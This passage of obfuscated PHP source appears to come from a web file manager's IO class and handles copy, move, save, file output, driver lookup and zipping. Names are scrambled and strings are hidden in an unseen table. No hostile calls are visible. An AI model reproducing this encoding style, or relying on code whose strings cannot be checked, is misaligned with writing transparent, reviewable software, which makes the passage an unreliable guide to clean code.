self::copyMoveStart($˜¤¯’Ì”, $õ²ƒğ¶š, $±›³õïØ, $_SERVER[¤·²È‰º][563], $‰»ôÌæµ); } public static function move($êä‘ÚÊî, $©“¨„¥â, $¤¦Îëì¨ = false, $¼Ï¥é‘û = false) { return self::copyMoveStart($êä‘ÚÊî, $©“¨„¥â, $¤¦Îëì¨, $_SERVER[¤·²È‰º][565], $¼Ï¥é‘û); } private static function copyMoveStart($Òµ×¿„’, $‡¼ó²üÃ, $ôËûı¡á, $¥’²‹îö, $Ë¢ëÕÑ¡) { $šåÅ¸œÁ =& $_SERVER[¤·²È‰º]; $ŸÂØ­Îš = array($Òµ×¿„’, $‡¼ó²üÃ, $ôËûı¡á, $Ë¢ëÕÑ¡); Hook::trigger($šåÅ¸œÁ[1141] . $¥’²‹îö . $šåÅ¸œÁ[1142], $ŸÂØ­Îš); $–ê‹Úı = self::copyMove($Òµ×¿„’, $‡¼ó²üÃ, $ôËûı¡á, $¥’²‹îö, $Ë¢ëÕÑ¡); Hook::trigger($šåÅ¸œÁ[1141] . $¥’²‹îö . $šåÅ¸œÁ[1144], $ŸÂØ­Îš, $–ê‹Úı); return $–ê‹Úı; } public static function saveFile($¯™Ü“¦Ô, $Ç®Ñã†ˆ, $³µË˜Ù¼ = true) { $Ğáº¼® =& $_SERVER[¤·²È‰º]; $´ôˆŒ£Â = self::info($Ç®Ñã†ˆ); $Ÿğİ¦¦æ = self::driverMake($¯™Ü“¦Ô); $Åñ£»Ñä = self::driverMake($Ç®Ñã†ˆ); $‹±Ëƒû… = !1; if ($Åñ£»Ñä->pathParse[$Ğáº¼®[1145]]) { $‹±Ëƒû… = $Åñ£»Ñä; $¼¥«¬®Ó = $Åñ£»Ñä->pathParse[$Ğáº¼®[1145]]; $Åñ£»Ñä = self::driverMake($¼¥«¬®Ó); } if ($Ÿğİ¦¦æ->pathParse[$Ğáº¼®[1145]]) { $¦£áñªÍ = $Ÿğİ¦¦æ->pathParse[$Ğáº¼®[1145]]; $Ÿğİ¦¦æ = self::driverMake($¦£áñªÍ); } $áœû¦ü§ = $Åñ£»Ñä->pathFather($Ç®Ñã†ˆ); $™ÑîÉ²Í = !0; if (!$³µË˜Ù¼ && self::driverIsSame($Ÿğİ¦¦æ, $Åñ£»Ñä)) { $™ÑîÉ²Í = !1; } $Æ«´ßé = self::copyFile($Ÿğİ¦¦æ, $¯™Ü“¦Ô, $Åñ£»Ñä, $áœû¦ü§, $´ôˆŒ£Â[$Ğáº¼®[42]], $™ÑîÉ²Í); if ($‹±Ëƒû…) { $Æ«´ßé = $‹±Ëƒû…->getPathOuter($Æ«´ßé); } return $Æ«´ßé; } private static function copyMove($¥Ïâ“±Œ, $ß×¸¾à“, $ÓİÖïûÕ, $ÑÍÛ¬Ò, $€Äª = false) { $Ï´ÀÏ£ˆ =& $_SERVER[¤·²È‰º]; if (!$¥Ïâ“±Œ || $¥Ïâ“±Œ == $Ï´ÀÏ£ˆ[8] || !$ß×¸¾à“) { return !1; } ignore_timeout(); $ØœĞ‰· = self::driverMake($¥Ïâ“±Œ); $Ò“ùòè¼ = self::driverMake($ß×¸¾à“); $Ûšâ‡éã = $ÑÍÛ¬Ò == $Ï´ÀÏ£ˆ[565]; $š”ä·Å = !1; if ($Ò“ùòè¼->pathParse[$Ï´ÀÏ£ˆ[1145]]) { $š”ä·Å = $Ò“ùòè¼; $ß×¸¾à“ = $Ò“ùòè¼->pathParse[$Ï´ÀÏ£ˆ[1145]]; $Ò“ùòè¼ = self::driverMake($ß×¸¾à“); } if ($ØœĞ‰·->pathParse[$Ï´ÀÏ£ˆ[1145]]) { $¥Ïâ“±Œ = $ØœĞ‰·->pathParse[$Ï´ÀÏ£ˆ[1145]]; $ØœĞ‰· = self::driverMake($¥Ïâ“±Œ); } self::check($ØœĞ‰·, $¥Ïâ“±Œ, $Ò“ùòè¼, $ß×¸¾à“); Hook::trigger($Ï´ÀÏ£ˆ[1146], $ØœĞ‰·, $¥Ïâ“±Œ, $Ò“ùòè¼, $ß×¸¾à“); $µ¿Ø§³ = self::driverIsSame($ØœĞ‰·, $Ò“ùòè¼); if ($µ¿Ø§³) { if ($ÑÍÛ¬Ò == $Ï´ÀÏ£ˆ[565] && !method_exists($Ò“ùòè¼, $Ï´ÀÏ£ˆ[1147]) && trim($ß×¸¾à“, $Ï´ÀÏ£ˆ[8]) == trim($Ò“ùòè¼->pathFather($¥Ïâ“±Œ), $Ï´ÀÏ£ˆ[8])) { if ($ØœĞ‰·->pathThis($¥Ïâ“±Œ) != $€Äª && !$ØœĞ‰·->isTypeObject()) { return $ØœĞ‰·->rename($¥Ïâ“±Œ, $€Äª); } return $Ò“ùòè¼->getPathOuter($¥Ïâ“±Œ); } if (method_exists($Ò“ùòè¼, $ÑÍÛ¬Ò)) { return $Ò“ùòè¼->{$ÑÍÛ¬Ò}($¥Ïâ“±Œ, $ß×¸¾à“, $ÓİÖïûÕ, $€Äª); } } if ($µ¿Ø§³ && $ÑÍÛ¬Ò == $Ï´ÀÏ£ˆ[565] && $Ò“ùòè¼->getType() == $Ï´ÀÏ£ˆ[116]) { $ûˆıĞçÉ = $Ò“ùòè¼->movePath($¥Ïâ“±Œ, $ß×¸¾à“, $€Äª); if ($ûˆıĞçÉ) { return $ûˆıĞçÉ; } } $‚Î’·¬Ó = $ØœĞ‰·->isFile($¥Ïâ“±Œ); if (!$‚Î’·¬Ó && $Ò“ùòè¼->getType() == $Ï´ÀÏ£ˆ[759] && $ØœĞ‰·->getType() == $Ï´ÀÏ£ˆ[116]) { $ûˆıĞçÉ = $Ò“ùòè¼->copyFolderFromIO($ØœĞ‰·, $¥Ïâ“±Œ, $ß×¸¾à“, $ÓİÖïûÕ, $Ûšâ‡éã, $€Äª); } else { $ûˆıĞçÉ = self::copyPath($ØœĞ‰·, $¥Ïâ“±Œ, $Ò“ùòè¼, $ß×¸¾à“, $ÓİÖïûÕ, $Ûšâ‡éã, $‚Î’·¬Ó, $€Äª); } if ($ûˆıĞçÉ && $Ûšâ‡éã) { $ØœĞ‰·->remove($¥Ïâ“±Œ); } if ($š”ä·Å) { $ûˆıĞçÉ = $š”ä·Å->getPathOuter($ûˆıĞçÉ); } return $ûˆıĞçÉ; } private static function check($ÄÅ˜¬Üù, $øŸ¹â€û, $ÂÕ€®Ñ, &$Äìõœ¨À) { $„»Ñ‡ı¸ =& $_SERVER[¤·²È‰º]; if (self::driverIsSame($ÄÅ˜¬Üù, $ÂÕ€®Ñ) && $ÄÅ˜¬Üù->isFolder($øŸ¹â€û) && $ÄÅ˜¬Üù->isParentOf($øŸ¹â€û, $Äìõœ¨À)) { show_json(LNG($„»Ñ‡ı¸[1148]), !1); } if (!$ÄÅ˜¬Üù->exist($øŸ¹â€û)) { show_json(LNG($„»Ñ‡ı¸[115]), !1); } } private static function copyPath($ÂÃÇÄô, $Ü‘ÖáíÖ, $É¡÷¬í‘, $ñ²æğæÜ, $ÓÑ“ş, $£˜å¸Ü†, $¤òÏ˜×È, $ú³Šô¼Ô = false, $Œõ¨¿µ = true) { $µà’‹Í˜ =& $_SERVER[¤·²È‰º]; $Å·Æ¨Âª = empty($ú³Šô¼Ô) && $ú³Šô¼Ô !== $µà’‹Í˜[207] ? $ÂÃÇÄô->pathThis($Ü‘ÖáíÖ) : $ú³Šô¼Ô; if ($ÓÑ“ş) { $Í‡ÇîŠ… = $É¡÷¬í‘->fileNameExist($ñ²æğæÜ, $Å·Æ¨Âª); $¢èıº¤° = $Å·Æ¨Âª; $Å·Æ¨Âª = $É¡÷¬í‘->fileNameAuto($ñ²æğæÜ, $Å·Æ¨Âª, $ÓÑ“ş, !$¤òÏ˜×È); if (!$Í‡ÇîŠ… || $¢èıº¤° != $Å·Æ¨Âª) { $ÓÑ“ş = !1; } if ($Œõ¨¿µ && !$ÓÑ“ş) { $É¡÷¬í‘->_data[$µà’‹Í˜[1149]] = !0; } } if ($¤òÏ˜×È) { return self::copyFile($ÂÃÇÄô, $Ü‘ÖáíÖ, $É¡÷¬í‘, $ñ²æğæÜ, $Å·Æ¨Âª, $£˜å¸Ü†); } if ($ÓÑ“ş == REPEAT_RENAME_FOLDER) { $ÓÑ“ş = !1; } $õ©’àÙ = rtrim($ñ²æğæÜ, $µà’‹Í˜[8]) . $µà’‹Í˜[8] . $Å·Æ¨Âª; $è§²ë‘æ = $É¡÷¬í‘->mkdir($É¡÷¬í‘->getPath($õ©’àÙ), $ÓÑ“ş); $ñ²æğæÜ = $É¡÷¬í‘->getPathInner($è§²ë‘æ); $ˆÎÓ¦¹¤ = $ÂÃÇÄô->listPath($Ü‘ÖáíÖ, !0); $ˆÎÓ¦¹¤ = is_array($ˆÎÓ¦¹¤) ? $ˆÎÓ¦¹¤ : array($µà’‹Í˜[93] => array(), $µà’‹Í˜[92] => array()); $åˆ­ù‘ç = array_merge($ˆÎÓ¦¹¤[$µà’‹Í˜[93]], $ˆÎÓ¦¹¤[$µà’‹Í˜[92]]); foreach ($åˆ­ù‘ç as $†¬à´ù˜) { $Ú¬Áï¹í = $†¬à´ù˜[$µà’‹Í˜[43]] == $µà’‹Í˜[209]; $Ü‘ÖáíÖ = $ÂÃÇÄô->getPathInner($†¬à´ù˜[$µà’‹Í˜[94]]); $óŞø™•ò = self::copyPath($ÂÃÇÄô, $Ü‘ÖáíÖ, $É¡÷¬í‘, $ñ²æğæÜ, $ÓÑ“ş, $£˜å¸Ü†, $Ú¬Áï¹í, !1, !1); if (!$óŞø™•ò) { IO::errorTips($µà’‹Í˜[1150] . $Ü‘ÖáíÖ . $µà’‹Í˜[80] . $ñ²æğæÜ); } } self::copyMoveKeepInfo($ÂÃÇÄô, $Ü‘ÖáíÖ, $è§²ë‘æ); return $è§²ë‘æ; } private static function copyFile($“ É€Ü–, $ƒí¦ìåò, $’ïõÊñ, $ÌÉè– œ, $Æúª¡íæ, $´Ğ‚‚ïó) { $™‚›®æ¯ =& $_SERVER[¤·²È‰º]; $ÌÉè– œ = $’ïõÊñ->getPath(rtrim($ÌÉè– œ, $™‚›®æ¯[8]) . $™‚›®æ¯[8] . $Æúª¡íæ); $©ÇÉîíÒ = $™‚›®æ¯[1151] . time() . rand_string(5); Hook::trigger($™‚›®æ¯[1152], $“ É€Ü–, $ƒí¦ìåò, $’ïõÊñ, $ÌÉè– œ, $Æúª¡íæ, $©ÇÉîíÒ); if (self::driverIsSame($“ É€Ü–, $’ïõÊñ)) { if ($´Ğ‚‚ïó) { $æé¹£¤ë = $’ïõÊñ->moveFile($ƒí¦ìåò, $ÌÉè– œ); } else { $æé¹£¤ë = $’ïõÊñ->copyFile($ƒí¦ìåò, $ÌÉè– œ); } Hook::trigger($™‚›®æ¯[1153], $“ É€Ü–, $ƒí¦ìåò, $’ïõÊñ, $ÌÉè– œ, $Æúª¡íæ, $æé¹£¤ë); self::copyMoveKeepInfo($“ É€Ü–, $ƒí¦ìåò, $æé¹£¤ë); return $æé¹£¤ë; } $ÊØÇˆ´Î = TEMP_FILES; if ($GLOBALS[$™‚›®æ¯[6]][$™‚›®æ¯[99]][$™‚›®æ¯[797]]) { $ÊØÇˆ´Î = $GLOBALS[$™‚›®æ¯[6]][$™‚›®æ¯[99]][$™‚›®æ¯[797]]; } $‹ú°ˆÅ = $ÊØÇˆ´Î; mk_dir($‹ú°ˆÅ); $ë±”½é› = $‹ú°ˆÅ . $©ÇÉîíÒ; $À†ºûƒ = $ë±”½é›; $ë±”½é› = $“ É€Ü–->download($ƒí¦ìåò, $ë±”½é›); $ë±”½é› = $“ É€Ü–->iconvApp($ë±”½é›); if (substr($ë±”½é›, strlen($ÊØÇˆ´Î)) == $ÊØÇˆ´Î) { $´Ğ‚‚ïó = !0; } $æé¹£¤ë = $’ïõÊñ->upload($ÌÉè– œ, $ë±”½é›, $´Ğ‚‚ïó); self::remove($À†ºûƒ); Hook::trigger($™‚›®æ¯[1153], $“ É€Ü–, $ƒí¦ìåò, $’ïõÊñ, $ÌÉè– œ, $Æúª¡íæ, $æé¹£¤ë); self::copyMoveKeepInfo($“ É€Ü–, $ƒí¦ìåò, $æé¹£¤ë); return $æé¹£¤ë; } private static function copyMoveKeepInfo($Ñ¨¢ÜÉş, $İŸšÌœ”, $ë—Ì‡) { if (!$ë—Ì‡) { return; } $Áğ¡Ûà = $Ñ¨¢ÜÉş->info($İŸšÌœ”); if (!is_array($Áğ¡Ûà)) { return; } IO::setModifyTime($ë—Ì‡, $Áğ¡Ûà[$_SERVER[¤·²È‰º][95]]); } public static function pathFather($‡ş²Ğëù) { $òİ“Ş˜€ = IO::init($‡ş²Ğëù); $ù”ñ²òï = $òİ“Ş˜€->pathFather($òİ“Ş˜€->path); return $òİ“Ş˜€->getPathOuter($ù”ñ²òï); } public static function fileOut($ÜÙøü¦‘, $Ô¼–İì = false, $£¹Ÿã¶ı = false, $ÁåüÏ¿ç = '') { $ˆæÅº = self::driverMake($ÜÙøü¦‘); if ($ˆæÅº->isFileOutServer()) { return $ˆæÅº->fileOutServer($ÜÙøü¦‘, $Ô¼–İì, $£¹Ÿã¶ı, $ÁåüÏ¿ç); } return $ˆæÅº->fileOut($ÜÙøü¦‘, $Ô¼–İì, $£¹Ÿã¶ı, $ÁåüÏ¿ç); } public static function fileOutImage($ô¿õ˜Šâ, $‹İÖí½ = 250) { $€Ÿ‰¬š² = array(250, 600, 1200, 2000, 3000, 5000); for ($•Ê¬Ñ¸ª = 0; $•Ê¬Ñ¸ª < count($€Ÿ‰¬š²); $•Ê¬Ñ¸ª++) { if ($•Ê¬Ñ¸ª == 0 && $‹İÖí½ <= $€Ÿ‰¬š²[$•Ê¬Ñ¸ª]) { $‹İÖí½ = $€Ÿ‰¬š²[$•Ê¬Ñ¸ª]; break; } else { if ($‹İÖí½ > $€Ÿ‰¬š²[$•Ê¬Ñ¸ª - 1] && $‹İÖí½ <= $€Ÿ‰¬š²[$•Ê¬Ñ¸ª]) { $‹İÖí½ = $€Ÿ‰¬š²[$•Ê¬Ñ¸ª]; break; } else { if ($•Ê¬Ñ¸ª == count($€Ÿ‰¬š²) - 1 && $‹İÖí½ > $€Ÿ‰¬š²[$•Ê¬Ñ¸ª]) { $‹İÖí½ = $€Ÿ‰¬š²[$•Ê¬Ñ¸ª]; break; } } } } $ê³¿Úíè = self::driverMake($ô¿õ˜Šâ); if ($ê³¿Úíè->isFileOutServer()) { return $ê³¿Úíè->fileOutImageServer($ô¿õ˜Šâ, $‹İÖí½); } return $ê³¿Úíè->fileOutImage($ô¿õ˜Šâ, $‹İÖí½); } private static function driverIsSame($’¾ïñÅØ, $¸âü›Î) { $ÀÚÆ©‚ä =& $_SERVER[¤·²È‰º]; $˜³ßí = $’¾ïñÅØ->getType(); $¡ˆŒÍ¨ä = $¸âü›Î->getType(); if ($˜³ßí != $¡ˆŒÍ¨ä) { return !1; } if ($˜³ßí == $ÀÚÆ©‚ä[759]) { return !0; } if ($˜³ßí == $ÀÚÆ©‚ä[116]) { return !0; } if ($’¾ïñÅØ->pathDriver == $¸âü›Î->pathDriver) { return !0; } return !1; } public static function copyUpdate($¨£Ù®‘©, $è‰‹¿‡) { $ ëûÂİâ =& $_SERVER[¤·²È‰º]; if (!IO::exist($¨£Ù®‘©)) { return !1; } if (!IO::exist($è‰‹¿‡)) { IO::mkdir($è‰‹¿‡); } $º÷ğ“ñª = self::_listAll($¨£Ù®‘©); $ÖğÛ”¼Ñ = self::_listAll($è‰‹¿‡); $–êäÏ = array(); $ºÂ’Ğƒ½ = array(); foreach ($º÷ğ“ñª as $øøœ¸’ƒ => $„õõÎ¿Î) { if (isset($ÖğÛ”¼Ñ[$øøœ¸’ƒ])) { if ($„õõÎ¿Î[$ ëûÂİâ[85]] == 1) { continue; } if ($ÖğÛ”¼Ñ[$øøœ¸’ƒ][$ ëûÂİâ[86]] == $„õõÎ¿Î[$ ëûÂİâ[86]]) { continue; } } if ($„õõÎ¿Î[$ ëûÂİâ[85]] == 1) { $ºÂ’Ğƒ½[] = $è‰‹¿‡ . $ ëûÂİâ[8] . $øøœ¸’ƒ; continue; } $ˆ—´ö±» = strstr(trim($øøœ¸’ƒ, $ ëûÂİâ[8]), $ ëûÂİâ[8]) ? get_path_father($øøœ¸’ƒ) : $ ëûÂİâ[12]; $–êäÏ[] = array($ ëûÂİâ[1154] => $„õõÎ¿Î[$ ëûÂİâ[94]], $ ëûÂİâ[1155] => rtrim($è‰‹¿‡, $ ëûÂİâ[8]) . $ ëûÂİâ[8] . $ˆ—´ö±», $ ëûÂİâ[1156] => $„õõÎ¿Î); } $ã¹ØÂ¸ = array($ ëûÂİâ[209] => $–êäÏ, $ ëûÂİâ[85] => $ºÂ’Ğƒ½); Hook::trigger($ ëûÂİâ[1157], $¨£Ù®‘©, $è‰‹¿‡, $ã¹ØÂ¸); foreach ($ºÂ’Ğƒ½ as $„õõÎ¿Î) { IO::mkdir($„õõÎ¿Î); } foreach ($–êäÏ as $„õõÎ¿Î) { IO::copy($„õõÎ¿Î[$ ëûÂİâ[1154]], $„õõÎ¿Î[$ ëûÂİâ[1155]], REPEAT_REPLACE); } } private static function _listAll($ªÇ–àá) { $°œÉ³úå =& $_SERVER[¤·²È‰º]; $ªÇ–àá = KodIO::clear($ªÇ–àá); $³â²êÁ = IO::listAll($ªÇ–àá); foreach ($³â²êÁ as &$Âû÷ŸÎ¤) { $ğ½Ş‹ÄŒ = substr($Âû÷ŸÎ¤[$°œÉ³úå[94]], strlen($ªÇ–àá)); $Âû÷ŸÎ¤[$°œÉ³úå[1158]] = trim($ğ½Ş‹ÄŒ, $°œÉ³úå[8]); } unset($Âû÷ŸÎ¤); return array_to_keyvalue($³â²êÁ, $°œÉ³úå[1158]); } public static function fileSubstr($ïĞ„ñ³Ö, $¥€¹ŒêÅ, $İİá¥È = false) { $ìæ‘¥Ã =& $_SERVER[¤·²È‰º]; $ÁØĞ¡“ = self::driverMake($ïĞ„ñ³Ö); $ä£ñ¨¯õ = $ÁØĞ¡“->size($ïĞ„ñ³Ö); $Ú¨å·Áå = $¥€¹ŒêÅ; $¥£é¯ş = $İİá¥È; if ($¥€¹ŒêÅ < 0) { $¥€¹ŒêÅ = $ä£ñ¨¯õ + $¥€¹ŒêÅ; } if ($İİá¥È === !1) { $İİá¥È = $ä£ñ¨¯õ - $¥€¹ŒêÅ; } if ($¥€¹ŒêÅ + $İİá¥È > $ä£ñ¨¯õ) { $İİá¥È = $ä£ñ¨¯õ - $¥€¹ŒêÅ; } if (!$ä£ñ¨¯õ && $ÁØĞ¡“->getType() == $ìæ‘¥Ã[116] && !$ÁØĞ¡“->exist($ïĞ„ñ³Ö)) { $ßÎ‰Ç¬¶ = get_path_this($ïĞ„ñ³Ö); $ÓŸÈ‘Êò = parse_url_query($ßÎ‰Ç¬¶); if (is_array($ÓŸÈ‘Êò) && isset($ÓŸÈ‘Êò[$ìæ‘¥Ã[42]])) { $ßÎ‰Ç¬¶ = urldecode($ÓŸÈ‘Êò[$ìæ‘¥Ã[42]]); } throw new Exception($ìæ‘¥Ã[1159] . LNG($ìæ‘¥Ã[1160]) . $ìæ‘¥Ã[960] . clear_html($ßÎ‰Ç¬¶) . $ìæ‘¥Ã[12]); } if ($İİá¥È <= 0) { return $ìæ‘¥Ã[12]; } if ($¥€¹ŒêÅ < 0 || $¥€¹ŒêÅ >= $ä£ñ¨¯õ || $İİá¥È > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\122\145\141\x64\40\x65\162\162\157\x72\41\40\163\x74\141\x72\164\75{$¥€¹ŒêÅ}\73\154\145\156\147\x74\x68\75{$İİá¥È}\73\x20\163\151\172\x65\x3d{$ä£ñ¨¯õ}\x3b"); } $€‰ò©© = $ÁØĞ¡“->fileSubstr($ïĞ„ñ³Ö, $¥€¹ŒêÅ, $İİá¥È); if (!$€‰ò©© && $İİá¥È && isset($GLOBALS[$ìæ‘¥Ã[1161]])) { throw new Exception($GLOBALS[$ìæ‘¥Ã[1161]][$ìæ‘¥Ã[1162]]); } return $€‰ò©©; } private static function driverMake(&$èŸÅ÷Ğ) { $°§ÖŸã  =& $_SERVER[¤·²È‰º]; $ÕŞù™‚ = KodIO::parse($èŸÅ÷Ğ); if (!self::$driverListSystem) { $Ùœ¶Ëµ = Model($°§ÖŸã [768])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ùœ¶Ëµ, $°§ÖŸã [407]); } if ($ÕŞù™‚[$°§ÖŸã [43]] == KodIO::KOD_IO && !self::$driverListSystem[$ÕŞù™‚[$°§ÖŸã [407]]]) { return !1; } $èŸÅ÷Ğ = $ÕŞù™‚[$°§ÖŸã [1163]]; $Ö­Šß¡ë = self::driverGet($ÕŞù™‚, $èŸÅ÷Ğ); return $Ö­Šß¡ë; } private static function driverGet($üÈ¨ÍÑÄ, &$•‡ĞÀÎş) { $˜è°ÃÃæ =& $_SERVER[¤·²È‰º]; $›áº›Â† = $üÈ¨ÍÑÄ[$˜è°ÃÃæ[1164]]; $ì‰Í©öÃ = $üÈ¨ÍÑÄ[$˜è°ÃÃæ[407]]; switch ($üÈ¨ÍÑÄ[$˜è°ÃÃæ[43]]) { case KodIO::KOD_IO: $‹¹À´ğ“ = self::$driverListSystem[$ì‰Í©öÃ]; break; case KodIO::KOD_SOURCE: $•‡ĞÀÎş = $ì‰Í©öÃ . $•‡ĞÀÎş; $‹¹À´ğ“ = array($˜è°ÃÃæ[1165] => $˜è°ÃÃæ[1166], $˜è°ÃÃæ[6] => $üÈ¨ÍÑÄ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $áŸˆÑÇ“ = $GLOBALS[$˜è°ÃÃæ[1167]]; self::$driverListUser = array_to_keyvalue($áŸˆÑÇ“, $˜è°ÃÃæ[407]); } $‹¹À´ğ“ = self::$driverListUser[$ì‰Í©öÃ]; break; case KodIO::KOD_SHARE_LINK: $‹¹À´ğ“ = array($˜è°ÃÃæ[1165] => $˜è°ÃÃæ[1168], $˜è°ÃÃæ[6] => $üÈ¨ÍÑÄ); $ÆË’„¡Ø = Action($˜è°ÃÃæ[1169])->sharePathInfo($üÈ¨ÍÑÄ[$˜è°ÃÃæ[94]]); $•‡ĞÀÎş = $ÆË’„¡Ø[$˜è°ÃÃæ[410]]; if (!$ÆË’„¡Ø[$˜è°ÃÃæ[410]]) { $„·Ê‰Ï„ = Model($˜è°ÃÃæ[609])->getInfo($ÆË’„¡Ø[$˜è°ÃÃæ[497]]); $•‡ĞÀÎş = KodIO::clear($„·Ê‰Ï„[$˜è°ÃÃæ[1170]] . $üÈ¨ÍÑÄ[$˜è°ÃÃæ[1163]]); $üÈ¨ÍÑÄ[$˜è°ÃÃæ[495]] = $„·Ê‰Ï„; $üÈ¨ÍÑÄ[$˜è°ÃÃæ[1145]] = $•‡ĞÀÎş; $‹¹À´ğ“ = array($˜è°ÃÃæ[1165] => $˜è°ÃÃæ[1171], $˜è°ÃÃæ[6] => $üÈ¨ÍÑÄ); } break; case KodIO::KOD_SHARE_ITEM: $‹¹À´ğ“ = array($˜è°ÃÃæ[1165] => $˜è°ÃÃæ[1172], $˜è°ÃÃæ[6] => $üÈ¨ÍÑÄ); $„·Ê‰Ï„ = Model($˜è°ÃÃæ[609])->getInfo($üÈ¨ÍÑÄ[$˜è°ÃÃæ[407]]); if ($„·Ê‰Ï„[$˜è°ÃÃæ[410]] == $˜è°ÃÃæ[207]) { $•‡ĞÀÎş = KodIO::clear($„·Ê‰Ï„[$˜è°ÃÃæ[1170]] . $üÈ¨ÍÑÄ[$˜è°ÃÃæ[1163]]); $üÈ¨ÍÑÄ[$˜è°ÃÃæ[495]] = $„·Ê‰Ï„; $üÈ¨ÍÑÄ[$˜è°ÃÃæ[1145]] = $•‡ĞÀÎş; $‹¹À´ğ“ = array($˜è°ÃÃæ[1165] => $˜è°ÃÃæ[1173], $˜è°ÃÃæ[6] => $üÈ¨ÍÑÄ); } else { if (!$•‡ĞÀÎş) { $•‡ĞÀÎş = $„·Ê‰Ï„[$˜è°ÃÃæ[410]]; } } break; default: $•‡ĞÀÎş = $üÈ¨ÍÑÄ[$˜è°ÃÃæ[94]]; $‹¹À´ğ“ = array($˜è°ÃÃæ[1165] => $˜è°ÃÃæ[1174]); break; } $¤ıÅ˜Î = $üÈ¨ÍÑÄ[$˜è°ÃÃæ[94]]; if (!isset(self::$driverCache[$¤ıÅ˜Î])) { $¼¢„Èş³ = strtolower($‹¹À´ğ“[$˜è°ÃÃæ[105]]); $›šù¢Çù = $GLOBALS[$˜è°ÃÃæ[6]][$˜è°ÃÃæ[99]][$˜è°ÃÃæ[827]]; $ı¡ÖŠÈ = $˜è°ÃÃæ[84] . (isset($›šù¢Çù[$¼¢„Èş³]) ? $›šù¢Çù[$¼¢„Èş³] : ucfirst($¼¢„Èş³)); if (!class_exists($ı¡ÖŠÈ)) { show_json("{$ı¡ÖŠÈ}\x20\156\x6f\164\x20\x65\x78\x69\163\164\163\x21", !1); } $óà´ÚÙé = isset($‹¹À´ğ“[$˜è°ÃÃæ[6]]) ? $‹¹À´ğ“[$˜è°ÃÃæ[6]] : !1; self::$driverCache[$¤ıÅ˜Î] = new $ı¡ÖŠÈ($óà´ÚÙé); } $¤¼İÎçñ = self::$driverCache[$¤ıÅ˜Î]; $¤¼İÎçñ->pathDriver = $›áº›Â†; $¤¼İÎçñ->pathBase = $˜è°ÃÃæ[12]; if (isset($‹¹À´ğ“[$˜è°ÃÃæ[6]][$˜è°ÃÃæ[1175]])) { $¤¼İÎçñ->pathBase = rtrim($‹¹À´ğ“[$˜è°ÃÃæ[6]][$˜è°ÃÃæ[1175]], $˜è°ÃÃæ[8]) . $˜è°ÃÃæ[8]; $•‡ĞÀÎş = $¤¼İÎçñ->pathBase . ltrim($•‡ĞÀÎş, $˜è°ÃÃæ[8]); } $•‡ĞÀÎş = $¤¼İÎçñ->getPath($•‡ĞÀÎş); if (isset($üÈ¨ÍÑÄ[$˜è°ÃÃæ[1145]])) { $•‡ĞÀÎş = $üÈ¨ÍÑÄ[$˜è°ÃÃæ[1145]]; } $¤¼İÎçñ->path = $•‡ĞÀÎş; return $¤¼İÎçñ; } public static function errorTips($“—æÀ¡ä = false) { $¡çÂ‰¡¥ =& $_SERVER[¤·²È‰º]; static $Ö›­—ÏÔ = array(); $Ä±äï˜³ = 1000; if ($“—æÀ¡ä === -1) { return $Ö›­—ÏÔ ? $Ö›­—ÏÔ[count($Ö›­—ÏÔ) - 1] : $¡çÂ‰¡¥[12]; } if ($“—æÀ¡ä === !1) { return implode($¡çÂ‰¡¥[18], $Ö›­—ÏÔ); } if (count($Ö›­—ÏÔ) >= $Ä±äï˜³) { $Ö›­—ÏÔ = array_slice($Ö›­—ÏÔ, $Ä±äï˜³ * 0.5, $Ä±äï˜³); } $Ö›­—ÏÔ[] = $“—æÀ¡ä; write_log($¡çÂ‰¡¥[172] . ACTION . $¡çÂ‰¡¥[1176] . $“—æÀ¡ä, $¡çÂ‰¡¥[1177]); } public static function getLastError($ïı¼Œ†ğ = '') { $Îäß³¶® = self::errorTips(-1); return $Îäß³¶® ? $Îäß³¶® : $ïı¼Œ†ğ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $å¨Ø¶İ; if (!$å¨Ø¶İ) { $ŒÔ½ÆÍÅ = IO::init($_SERVER[¤·²È‰º][8]); } return $ŒÔ½ÆÍÅ; } private static function iconvSystem($éß¸’Ú¸) { return self::local()->iconvSystem($éß¸’Ú¸); } private static function iconvApp($‚ı‘ëñ·) { return self::local()->iconvApp($‚ı‘ëñ·); } public static function zip($¿²—‡Ÿ, $Ñâ¬ñŒ¾ = "\x7a\151\160", $ºû†ÈÊ‘ = '', $ø™åŸ‰Ü = REPEAT_RENAME) { $ö¾©•–• =& $_SERVER[¤·²È‰º]; $º†Õ‹÷£ = self::init($¿²—‡Ÿ[0][$ö¾©•–•[94]]); $÷Ç–‚â = self::info($¿²—‡Ÿ[0][$ö¾©•–•[94]]); $ŒÉ¡èñ = !1; if (!$ºû†ÈÊ‘ && $º†Õ‹÷£->getType() == $ö¾©•–•[116]) { $—çöÛó = self::zipFileList($¿²—‡Ÿ); } else { $ŒÉ¡èñ = $ºû†ÈÊ‘ ? $ºû†ÈÊ‘ : TEMP_FILES . $ö¾©•–•[1178] . time() . rand_string(8) . $ö¾©•–•[8]; mk_dir($ŒÉ¡èñ); $—çöÛó = self::zipFileList($¿²—‡Ÿ, $ŒÉ¡èñ); } $Ş’®¤µí = $÷Ç–‚â[$ö¾©•–•[42]]; if (count($—çöÛó) > 1) { $Àæ®åÈƒ = IO::info(IO::pathFather($÷Ç–‚â[$ö¾©•–•[94]])); $Ş’®¤µí = $Àæ®åÈƒ[$ö¾©•–•[42]]; } $ÊÉ¤½´ã = $ŒÉ¡èñ; if (!$ÊÉ¤½´ã) { $ÊÉ¤½´ã = get_path_father($÷Ç–‚â[$ö¾©•–•[94]]); if (!$ºû†ÈÊ‘ && $º†Õ‹÷£->getType() == $ö¾©•–•[116]) { $ÊÉ¤½´ã = get_path_father($º†Õ‹÷£->path); } $¸¡ª‚øÒ = IO::info($ÊÉ¤½´ã); if (!$¸¡ª‚øÒ[$ö¾©•–•[212]]) { show_json(LNG($ö¾©•–•[1179]), !1); } } $ÛÀ•æÛå = $ÊÉ¤½´ã . $Ş’®¤µí . $ö¾©•–•[10] . $Ñâ¬ñŒ¾; $ÛÀ•æÛå = get_filename_auto($ÛÀ•æÛå, $ö¾©•–•[12], $ø™åŸ‰Ü); $öÂÀÖî = self::iconvSystem($ÛÀ•æÛå); foreach ($—çöÛó as $•¨ù‹Ğï => $À³³ßà ) { $—çöÛó[$•¨ù‹Ğï] = self::iconvSystem($À³³ßà ); } KodArchive::create($öÂÀÖî, 